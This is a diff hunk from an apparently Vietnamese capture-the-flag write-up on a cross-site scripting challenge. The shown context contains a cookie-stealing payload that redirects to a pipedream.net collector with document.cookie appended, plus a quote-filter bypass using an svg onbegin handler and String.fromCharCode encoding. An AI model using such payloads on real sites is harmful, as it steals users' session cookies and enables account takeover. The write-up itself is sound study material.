@@ -269,6 +269,7 @@ Vậy là thực thi thành công, tiếp theo đến phần chuyển trang vớ
 để lấy cookie ở đây là document['cookie'] cũng tương tự như trên:
 Ý tưởng payload sẽ là: dùng pipedream để tạo đường dẫn chuyển trang xong dùng concat để nối document['cookie'] vào như này: 
 > location='https://eo7xxasp6lhfvaj.m.pipedream.nethttps://eo7xxasp6lhfvaj.m.pipedream.net/?c='.concat(document['cookie'])
+ 
 Nhưng như đã nói ở trên ' ' và " " đề bị lọc nên kh thể thực hiện trực tiếp như trên được, nhưng để ý nó đều ở dạng string thì ta có thể thay thế nó 
 bằng cách tận dụng String.fromCharCode để khai thác. Payload như sau:
 > <svg><animatetransform onbegin=(location=(String.fromCharCode(104,116,116,112,115,58,47,47,101,111,55,120,120,97,115,112,54,108,104,102,118,97,106,46,109,46,112,105,112,101,100,114,101,97,109,46,110,101,116,47,63,99,61).concat(document[String.fromCharCode(99,111,111,107,105,101)])))>
